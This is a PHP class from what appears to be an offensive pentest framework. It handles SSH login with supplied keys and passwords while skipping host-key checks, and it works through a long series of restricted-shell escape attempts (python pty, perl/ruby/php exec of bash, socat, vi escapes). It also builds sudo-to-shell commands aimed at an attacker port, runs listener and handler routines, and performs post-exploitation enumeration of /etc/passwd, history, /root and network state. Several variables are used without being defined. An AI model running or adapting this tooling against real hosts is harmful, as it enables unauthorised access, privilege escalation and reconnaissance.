<?php

class STREAM4COM extends SERVICE4COM {

    
    public function __construct($eth,$domain,$ip,$port,$protocol) {
        parent::__construct($eth,$domain,$ip,$port,$protocol);
    }
    
  
    
    public function stream4key8priv4str($stream,$host,$port,$login,$private_key_str,$private_key_file){
        $this->ssTitre(__FUNCTION__);
        $this->str2file($private_key_str, $private_key_file);
        $obj_file = new FILE($private_key_file);
        $public_key_file = "$obj_file->file_dir/$obj_file->file_name.pub";
        if (!file_exists($public_key_file)) {
            $this->key2gen4priv("",10,$private_key_file, $public_key_file);
        }
        return $this->stream4key8public($stream,$host,$port,$login,$public_key_file,$private_key_file, "");
        
    }
    public function stream8ssh2key8priv4str($host,$port,$login,$private_key_str){
        $this->ssTitre(__FUNCTION__);
        $hash = sha1($private_key_str);
        
        $this->str2file($private_key_str, "/tmp/$hash.tmp");
        $query = "file /tmp/$hash.tmp";
        $check_pem = trim($this->req_ret_str($query));
        if (strstr($check_pem, "PEM RSA private key")!==FALSE){
            $this->log2succes("Convert PEM for libssh - PHP");
            $private_key_file = $this->key2gen4priv2pem("", 10, $private_key_file,$private_key_passwd);
        }
        
        return $this->stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file, $private_key_passwd);
    }
    
    public function stream8ssh2key8priv4file($host,$port,$login,$private_key_file,$private_key_passwd){
        /*
         https://medium.com/tsscyber/multiple-security-vulnerabilities-in-dell-emc-avamar-e114c16425d0
         */
        $this->ssTitre(__FUNCTION__);
        
        $obj_file = new FILE($private_key_file);
        $public_key_file = "$obj_file->file_dir/$obj_file->file_name.pub";
        
        
        if (!file_exists($public_key_file)) {
            $this->key2gen4priv("",10,$private_key_file, $public_key_file);
        }
        return $this->stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file, $private_key_passwd);
    }
    
    
    public function stream8ssh8key8public($host,$port,$login,$public_key_file,$private_key_file,$private_key_passwd){
        $this->ssTitre(__FUNCTION__);
        $login = trim($login);
        
        $query = "file $private_key_file";
        $check_pem = trim($this->req_ret_str($query));
        if (strstr($check_pem, "PEM RSA private key")!==FALSE){
            $this->log2succes("Convert PEM for libssh - PHP");
            $private_key_file = $this->key2gen4priv2pem("", 10, $private_key_file,$private_key_passwd);
        }
        $query = "head -5 $private_key_file";
        $priv_keys = trim($this->req_ret_str($query));
        if (empty($priv_keys)) return $this->log2error("Empty Private Key");
        $query = "head -5 $public_key_file";
        $pub_keys = trim($this->req_ret_str($query));
        if (empty($pub_keys)) return $this->log2error("Empty Public Key");
        $cmd = "id";
        $this->requette("chmod 600 $private_key_file");
        $this->requette("head -5 $private_key_file");
        $query = "ssh -i $private_key_file $login@$this->ip -p $port -o ConnectTimeout=15 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null  -C id";
        $this->cmd("localhost",$query);
        
        
        $con = @ssh2_connect( $host, $port,array('hostkey'=>'ssh-rsa') );
        if($con===FALSE) {
            $chaine = "Failed Connection";
            $this->log2error($chaine);
            return FALSE ;
        }
        $infos = "Public Key:$public_key_file\nPrivate Key:$private_key_file\nPass Key: $private_key_passwd";
        $this->note($infos);
        
        
        $this->requette("ls -al $public_key_file");
        $this->requette("file $public_key_file");
        $this->requette("head -5 $public_key_file");
        
        $this->requette("ls -al $private_key_file");
        $this->requette("file $private_key_file");
        $this->requette("head -5 $private_key_file");
        if (@ssh2_auth_pubkey_file($con,$login,$public_key_file,"$private_key_file.pem",$private_key_passwd)!==FALSE) {
            
            $this->yesAUTH($this->port2id, $login, "", "", "", "", "", "", $infos, $this->ip2geoip());
            $this->log2succes("Identification réussie en utilisant une clé publique");
            $this->port2shell(base64_encode($infos));
            $this->pause();
            return $con ;
        } else {
            $chaine = "Failed Public Key Authentication";
            $this->log2error($chaine);
            return FALSE ;
        }
        
        // $stream = ssh2_shell($con, 'vt102', null, 80, 24, SSH2_TERM_UNIT_CHARS);
        // $stream_out = ssh2_fetch_stream($stream, SSH2_STREAM_STDIO);
        
    }
    
    
    
    public function stream8ssh8passwd($host,$port,$login,$mdp) {
        $this->ssTitre(__FUNCTION__);
        $host = trim($host);
        $port = trim($port);
        $login = trim($login);
        $mdp = trim($mdp);
        
        $template_shell = "sshpass -p '$mdp' ssh $login@$host -p $port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C \"%SHELL%\" ";
        $this->cmd("Create Stream  SSH",$template_shell);
        
        $con = ssh2_connect( $host, $port);
        
        if(!$con) {
            $chaine = "Failed Connection";
            $this->log2error($chaine);
            return FALSE ;
        }
        else {
            if (!ssh2_auth_password( $con, $login, $mdp ))
            {
                $chaine = "Failed Auth SSH with Password";
                $this->log2error($chaine);
                return FALSE ;
            }
            else {
                
                $stream_shell = ssh2_shell($con, 'vt102', null, 80, 24, SSH2_TERM_UNIT_CHARS);
                $stream = ssh2_fetch_stream($stream_shell, SSH2_STREAM_STDIO);
                
                //$stream = ssh2_exec($con, $data);
                
                if (is_resource($stream)){
                    $this->note("Success Established Connexion");
                    $this->yesAUTH($this->port2id, $login, $mdp,"","", "", "", "",__FUNCTION__);
                    $this->port2shell(base64_encode($template_shell));
                    return $stream ;
                }
                else {
                    $chaine = "NOT STREAM";
                    $this->log2error($chaine);
                    var_dump($stream);
                    return FALSE; };
            }
        }
        
        
    }
    
    
    public function stream8shell2check($stream){
        $this->ssTitre(__FUNCTION__);
        /*
         https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
         https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/
         https://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref
         */
        $check = "";
        if (is_resource($stream)){
            
            
            $data = "echo \$SHELL";
            $this->article("DATA", $data);
            fputs($stream, "$data\n");
            
            
            $tmp = @stream_get_contents($stream);
            echo "$tmp\n";
            exec("echo '$tmp' $this->filter_file_path",$tmp2);
            if (!empty($tmp2)) {
                $shell_found = $tmp2[0];
                if (strstr($shell_found, "/bin/lshell")) {$this->rouge("LIMITED SHELL: $shell_found");return FALSE;}
                if (strstr($shell_found, "/bin/rbash"))  {$this->rouge("RESTRICTED Bash: $shell_found");return FALSE;}
                if (strstr($shell_found, "/bin/rksh"))  {$this->rouge("Korn Shell in restricted mode: $shell_found");return FALSE;}
                if (strstr($shell_found, "/bin/rzsh"))  {$this->rouge("RESTRICTED SHELL: $shell_found");return FALSE;}
                if (strstr($shell_found, "/bin/rssh"))  {$this->rouge("Restricted Secure Shell: $shell_found");return FALSE;}
                if (strstr($shell_found, "/bin/bash"))  {$this->note("Bash Shell: $shell_found");return TRUE;}
                if (strstr($shell_found, "/bin/csh"))  {$this->note("C Shell: $shell_found");return TRUE;}
                
            }
            return FALSE;
        }
        
    }
    
    
    public function stream4check($stream,$template_shell,$username,$userpass){
        $this->ssTitre(__FUNCTION__);
        $check = "";
        $shell_found = "";
        if (is_resource($stream)){
            
            
            //$data = "/bin/bash -li ";
            
            stream_set_timeout($stream,$this->stream_timeout);
            stream_set_blocking($stream, TRUE);
            
            
            
            if ($this->stream8shell2check($stream)) {
                $this->note("Normal Shell");
                $template_id = "%ID%";
                
                return array($stream,$template_id,$template_shell) ;
            }
            else {
                
                //https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/
                
                $data = "/usr/bin/id";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                
                $rst_id = @stream_get_contents($stream);
                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                $id8b64 = base64_encode($id);
                if (!empty($uid_name)){
                    $template_id = str_replace("/usr/bin/id","%ID%",$data);
                    
                    return array($stream,$template_id,$template_shell) ;
                    
                }
                $this->pause();
                
                
                $data = "id";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                
                $rst_id = @stream_get_contents($stream);
                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                $id8b64 = base64_encode($id);
                if (!empty($uid_name)){
                    $template_id = str_replace("id","%ID%",$data);
                    $template_shell = str_replace("%ID%", "%SHELL%", $template_id);
                    return array($stream,$template_id,$template_shell) ;
                    
                }
                $this->pause();
                
                //  ===================================================================
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "echo \$PATH";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $rst_path = stream_get_contents($stream);
                echo "$rst_path\n";
                
                $data = "ls $(echo \$PATH)";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $rst_path2 = stream_get_contents($stream);
                echo "$rst_path2\n";
                
                
                
                $data = "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                
                $rst_id = stream_get_contents($stream);
                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                if (!empty($uid_name)){
                    $template_id_new = str_replace("/usr/bin/id","%ID%",$data);

                    $template_shell_new = str_replace("%ID%","%SHELL%", $template_id_new);
                    return array($stream,$template_id_new,$template_shell_new) ;
                    
                }
                $this->pause();
                
                
                
                $data = "help";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $rst_help =  stream_get_contents($stream);
                echo "$rst_help\n";
                
                $data = "info bash";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                echo stream_get_contents($stream);
                
                /*
                 $data = "(sleep 15; echo \"! bash -li\";sleep 8 ; ) | socat - EXEC:\"man man\",pty,stderr,setsid,sigint,ctty,sane";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 $rst_app =  stream_get_contents($stream);
                 echo "$rst_app\n";
                 $data = "echo $0";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 $tmp = stream_get_contents($stream);
                 echo "$tmp\n";
                 
                 
                 $data = "echo -e \"man man <<# >/dev/null 2>&1\n! bash -li\nwhoami > /dev/tty\nls > /dev/tty\n#\" | bash ";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 echo  stream_get_contents($stream);
                 $data = "echo $0";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 $tmp = stream_get_contents($stream);
                 echo "$tmp\n";
                 
                 
                 $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nid > /dev/tty\nls > /dev/tty\n#\" | bash ";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 echo  stream_get_contents($stream);
                 $data = "echo $0";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 $tmp = stream_get_contents($stream);
                 echo "$tmp\n";
                 
                 $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nid > /dev/tty\nls > /dev/tty\n#\"  ";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 echo  stream_get_contents($stream);
                 $data = "echo $0";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 $tmp = stream_get_contents($stream);
                 echo "$tmp\n";
                 
                 $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nid\n#\" ";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 echo  stream_get_contents($stream);
                 $data = "echo $0";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 $tmp = stream_get_contents($stream);
                 echo "$tmp\n";
                 
                 $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nid\necho \$0\n > /dev/tty\n#\" ";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 echo  stream_get_contents($stream);
                 $data = "echo $0";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 $tmp = stream_get_contents($stream);
                 echo "$tmp\n";
                 
                 
                 $data = "echo -e \"vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\n#\" ; export SHELL=/bin/bash:\$SHELL ; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 
                 $rst_id = stream_get_contents($stream);
                 list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                 if (!empty($uid_name)){
                 $cmd = "%CMD%";
                 $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
                 $template_cmd_new = str_replace("%ID%", "%CMD%", $template_id_new);
                 $template_shell_new = str_replace("%CMD%","%SHELL%", $template_cmd_new);
                 return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
                 
                 }
                 $this->pause();
                 
                 
                 $data = "vi <<# >/dev/null 2>&1\n:set shell=/bin/sh\n:shell\n# ; export SHELL=/bin/bash:\$SHELL ; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
                 $this->article("DATA", $data);
                 fputs($stream, "$data\n");
                 
                 $rst_id = stream_get_contents($stream);
                 list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                 if (!empty($uid_name)){
                 $cmd = "%CMD%";
                 $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
                 $template_cmd_new = str_replace("%ID%", "%CMD%", $template_id_new);
                 $template_shell_new = str_replace("%CMD%","%SHELL%", $template_cmd_new);
                 return array($stream,$template_id_new,$template_cmd_new,$template_shell_new) ;
                 
                 }
                 $this->pause();
                 */
                
                $data = "export SHELL=/bin/bash:\$SHELL ; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; /usr/bin/id";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                
                $rst_id = stream_get_contents($stream);
                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                if (!empty($uid_name)){
                    $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
                    $template_shell_new = str_replace("%ID%","%SHELL%", $template_id_new);
                    return array($stream,$template_id_new,$template_shell_new) ;
                    
                }
                $this->pause();
                
                
                
                $data = "printf \"%s\\n\" $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                
                
                
                $data = "?";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "-h";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "--help";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "\$SHELL --version";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "echo \$BASH_VERSION";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "PS1= ";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                
                $data = "chsh -l";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "printenv";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "socat exec:'sh -li',pty,stderr,setsid,sigint,sane";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "python -c 'import pty; pty.spawn(\"/bin/bash\")'";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "php -r 'system(\"/bin/bash -li\");'";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "perl -e \"exec \\\"/bin/bash -li\\\";\"  ";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "ruby -e \"exec \\\"/bin/bash -li\\\";\"  ";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                $data = "/usr/bin/script -qc /bin/bash -li /dev/null";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                $data = "echo $0";
                $this->article("DATA", $data);
                fputs($stream, "$data\n");
                $tmp = stream_get_contents($stream);
                echo "$tmp\n";
                
                
                $rst_app = $rst_path.$rst_path2.$rst_help;
                
                
                foreach ($this->tab_sudo8app2shell as $app){
                    if (!empty($app)){
                        if (strstr($rst_app,$app)!==FALSE){
                            $obj_bin = new bin4linux($app);
                            $this->log2succes("Found APP to Bash");
                            $this->article("APP", $obj_bin->file_path);
                            $query = "echo '$rst_app' | grep '$app' ";
                            //system($query);
                            $attacker_ip = $this->ip4addr4target($this->ip);
                            $attacker_port = rand(1024,65535);
                            $shell = "/bin/sh";
                            $sudo = FALSE;
                            
                            $cmd = "$shell";
                            $data = $obj_bin->elf4root2cmd($this->ip, $attacker_port, $shell, $sudo, $userpass, $cmd);
                            $this->article("DATA", $data);
                            fputs($stream, "$data\n");
                            $data = "cd /tmp";
                            $this->article("DATA", $data);
                            fputs($stream, "$data\n");
                            $data = "/usr/bin/id";
                            $this->article("DATA", $data);
                            fputs($stream, "$data\n");
                            
                            $rst_id = stream_get_contents($stream);
                            
                            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                            if (!empty($uid_name)){
                                
                              
                                $data_id = $obj_bin->elf4root2cmd($this->ip, $attacker_port, $shell, $sudo, $userpass, $cmd);
                                
                                $template_id_new = "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; %ID%";
                                
                                $template_shell_new = str_replace("%SHELL%", " $data_id; $template_id_new", $template_shell);
                                $template_shell_new = str_replace("%ID%","%SHELL%", $template_shell_new);
                                return array($stream,$template_id_new,$template_shell_new) ;
                                
                            }
                        }
                    }
                }
                // ==================================================================
                
                
                
                // socat file:`tty`,raw,echo=0 tcp-listen:4444
                // echo -e "su - root <<! >/dev/null 2>&1\nsateam123456789\nwhoami > /dev/tty\nls > /dev/tty\n!" | bash
                
                
                return FALSE;
            }
        }
        
    }
    
    
    
    public function  stream8client($lport,$info,$whois,$time2wait){
        $this->titre(__FUNCTION__);
        $result = "";
        // http://php.net/manual/fr/function.socket-import-stream.php
        $info = trim($info);
        $lport = trim($lport);
        $time2wait = (int)$time2wait;
        
        if ($this->protocol=='T') $socket = stream_socket_client("tcp://$this->ip:$lport", $errno, $errstr);
        if ($this->protocol=='U') $socket = stream_socket_client("udp://$this->ip:$lport", $errno, $errstr);
        
        if (!$socket) {
            echo "$errstr ($errno)\n";
            exit();
        } else {
            $this->article("Server Listenning on Port", $lport);
            $this->article("Global TimeOut", $time2wait);
            
            $stream = stream_socket_accept($socket,$time2wait);
            
            
            if (!is_resource($stream)) {
                echo 'Impossible de créer le socket : '. socket_strerror(socket_last_error()) . PHP_EOL;
            }
            stream_set_blocking($stream, FALSE);
            //stream_set_timeout($stream,60);
            
            var_dump( posix_ttyname(STDIN) );
            var_dump( posix_ttyname(STDOUT) );
            
            
            $os = trim($this->ip2os4arch($this->ip2os()));
            switch ($os){
                
                case "windows" :
                case "Windows" :
                    $obj_lan = new lan4win($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $stream,$info);
                    $result .=  $obj_lan->root4pentest();
                    break ;
                    
                case "Linux" :
                case "Unix" :
                case "linux" :
                case "unix" :
                case "cisco" :
                default:
                    $cmd_id = "id";
                    $result .= $this->stream4root($stream);
                    
                    
                    break ;
            }
            $this->pause();
            fclose($socket);
            
        }
        echo $result;
        return $result;
    }
    
    
    
    
    public function  stream8server($lport,$lprotocol,$templateB64_id,$templateB64_shell,$whois,$time2wait){
        $this->titre(__FUNCTION__);
        $result = "";
        // http://php.net/manual/fr/function.socket-import-stream.php
        
        $lport = trim($lport);
        $lprotocol = trim($lprotocol);
        $time2wait = (int)$time2wait;
        $template_id = base64_decode($templateB64_id);
        
        if ($lprotocol=='T') $socket8server = stream_socket_server("tcp://".$this->ip4addr4target($this->ip).":$lport", $errno, $errstr);
        if ($lprotocol=='U') $socket8server = stream_socket_server("udp://".$this->ip4addr4target($this->ip).":$lport", $errno, $errstr, STREAM_SERVER_BIND);
        
        var_dump($socket8server);
        
        if (!$socket8server) {
            echo "$errstr ($errno)\n";
            die();
        } else {
            $this->article("Server Listenning on Port", $lport);
            $this->article("Protocol", $lprotocol);
            $this->article("Template ID",$template_id );
            $this->article("Whois", $whois);
            $this->article("Global TimeOut", $time2wait);
            
            
            if ($lprotocol=='T') $stream = stream_socket_accept($socket8server,$time2wait);
            if ($lprotocol=='U') $stream = $socket8server;
            var_dump($stream);
            var_dump(stream_socket_get_name($stream,TRUE));
            
            if (!is_resource($stream)) {
                echo 'Impossible de créer la socket : '. socket_strerror(socket_last_error()) . PHP_EOL;
                die();
            }
            stream_set_blocking($stream, FALSE);
            //stream_set_timeout($stream,60);
            
            $this->article("STDIN",posix_ttyname(STDIN));
            $this->article("STDOUT",posix_ttyname(STDOUT));
            var_dump(stream_get_meta_data($stream));
            
            
            $os = trim($this->ip2os4arch($this->ip2os()));
            switch ($os){
                
                case "windows" :
                case "Windows" :
                    $obj_lan = new lan4win($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $stream,$templateB64_id);
                    $result .=  $obj_lan->root4pentest();
                    break ;
                    
                case "Linux" :
                case "Unix" :
                case "linux" :
                case "unix" :
                case "cisco" :
                default:

                    $id = str_replace("%ID%", "id", $template_id);
                    $rst = $this->req_str($stream, $id, 10," | grep 'uid=' ");
                    list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id8str) = $this->parse4id($rst);
                    $id8b64 = base64_encode($id8str);
                    $this->article("CREATE Template ID", $template_id);
                    $template_shell = base64_decode($templateB64_shell);
                    $this->article("CREATE Template SHELL", $template_shell);
                    
                    
                    
                    $obj_lan = new lan4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $stream,$templateB64_id,$templateB64_shell,$id8b64);
                    var_dump($this->flag_poc);
                    $obj_lan->poc($this->flag_poc);
                    var_dump($obj_lan->flag_poc);
                    $obj_lan->lan2root();
                    break ;
            }
            fclose($stream);
            fclose($socket8server);
            
        }
        echo $result;
        return $result;
    }
    

    
    
    public function env2path2info($stream){
        $data = "cat /etc/environment";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $data = "systemctl show-environment";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        $data = "echo \$PATH ";
        return $this->req_str($stream,$data,$this->stream_timeout,"");
    }
    
    public function host2info($stream){
        
        $this->titre(__FUNCTION__);
        
        $data = "id ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "/usr/bin/id ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $data = "echo \$LOGNAME ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("logged on");
        $data = "who 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "w 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $this->note("Users that have previously logged onto the system");
        $data = "lastlog 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "last 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("What has the user being doing? Is there any password in plain text? What have they been edting?");
        $data = "history";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "date";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "uname -a";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        
        $data = "echo \$PWD ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "echo \$HOME ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $data = "echo \$SESSION";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "echo \$TERM";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "echo \$SHELL ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "echo $0";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "echo \$BASH_VERSION";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "\$SHELL --version";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        
        $data = "cat /etc/passwd ";
        $strings_etc_passwd = $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->parse4etc_passwd($strings_etc_passwd);
        
        $this->users2gid_root();
        
        
        
        
        
        $data = "echo \$JOB ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "echo \$DISPLAY ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        
        
        $this->note("checks to see if roots home directory is accessible");
        $data = "ls -ahl /root/ 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("Accounts that have recently used sudo");
        $data = "find /home -name .sudo_as_admin_successful 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $data = "groups";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "grep -E '^UID_MIN|^UID_MAX' /etc/login.defs";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->ssTitre("World-readable files within /home");
        $data = "find /home/ -perm -4 -type f -exec ls -al {} \; 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("Noowner files");
        $data = "find / -xdev \( -nouser -o -nogroup \) -print 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout*3,"");
        
        $data = "find / -writable -type d 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout*3,"");
        
        $data = "find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout*3,"");
        
        
        $data = "grep -v -e '^$' /etc/hosts /etc/resolv.conf  | grep -v '^#' | sort -u 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "dnsdomainname";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        
        $this->note("Provides a list of active connections.
Can be used to determine what ports are listening on the server");
        $data = "cat /proc/net/tcp";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "cat /proc/net/udp";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("This is used for route caching.
This can also be used to determine local IPs, as well as gain a better understanding of the target's networking structure");
        $data = "cat /proc/net/fib_trie";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $this->note("listening TCP");
        $data = "netstat -antp 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "ss -t 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $this->note("listening UDP");
        $data = "netstat -anup 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "ss -u 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "find / -executable -user $this->uid_name ! -group $this->uid_name -type f ! -path \"/proc/*\" ! -path \"/sys/*\" -exec ls -al {} \; 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout*3,"");
        
    }
    
    public function whoami($stream){
        $username_found = "";
        $rst = $this->id();
        list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
        return $uid_name;
    }
    
    public function id($stream){
        $data = "id";
        return $this->req_str($stream,$data,$this->stream_timeout,"");
        
    }
    
    public function ip4wan($stream){
        $data = "wget http://ipecho.net/plain -O - -q ; echo";
        return trim($this->req_str($stream,$data,$this->stream_timeout,""));
    }
    
    
    
    public function search4app4exist($stream,$app){
        $this->titre(__FUNCTION__);
        $app = trim($app);
        $data =  "which $app";
        $app_path = trim($this->req_str($stream,$data,$this->stream_timeout,""));
